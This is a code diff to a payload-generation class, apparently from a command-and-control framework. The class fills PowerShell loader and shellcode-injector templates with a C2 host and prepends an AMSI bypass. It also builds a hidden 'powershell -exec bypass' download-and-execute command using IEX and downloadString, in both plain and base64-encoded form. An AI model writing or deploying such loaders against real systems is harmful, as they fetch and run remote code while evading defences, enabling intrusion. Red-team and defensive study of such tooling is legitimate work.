@@ -868,7 +868,7 @@ class Payloads(object):
         with open("%sSharp-Loader.ps1" % PayloadTemplatesDirectory, 'r') as f:
             content = f.read()
         self.PSSharpLoader = str(content) \
-            .replace("#REPLACECONNECTURL#",self.FirstURL) \
+            .replace("#REPLACECONNECTURL#",self.PayloadCommsHost.strip("\"")) \
             .replace("#REPLACEQUICKCOMMAND#",self.QuickCommand) \
             .replace("#REPLACECSHARPFILENAME#",name+"cs_drop")
         self.PSSharpLoader = self.amsiBypass + self.PSSharpLoader
@@ -889,7 +889,8 @@ class Payloads(object):
         # insert_hosted_file("%s%sreflective_injector"% (self.QuickCommand,name), "%s%ssharp_loader.ps1" % (PayloadsDirectory,name), "text/html", "No", "Yes")
 
         command = f''' "IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}{name}cs_load')" '''
-        b64command = base64.b64encode(command.encode('UTF-16LE')).decode("UTF-8")
+        b64command = f''' IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}{name}cs_load') '''
+        b64command = base64.b64encode(b64command.encode('UTF-16LE')).decode("UTF-8")
         self.QuickstartLog(f"Download and execute C# Powershell Loader: powershell -exec bypass -Noninteractive -windowstyle hidden -c %s" % command)
         self.QuickstartLog(f"Download and execute C# Powershell Loader: powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % b64command)
 
@@ -899,7 +900,7 @@ class Payloads(object):
         with open("%sInvoke-Shellcode.ps1" % PayloadTemplatesDirectory, 'r') as f:
             content = f.read()
         self.PSInjector = str(content) \
-            .replace("#REPLACECONNECTURL#", self.FirstURL) \
+            .replace("#REPLACECONNECTURL#", self.PayloadCommsHost.strip("\"")) \
             .replace("#REPLACEQUICKCOMMAND#", self.QuickCommand) \
             .replace("#REPLACEB64SHELLCODE#", name)
 
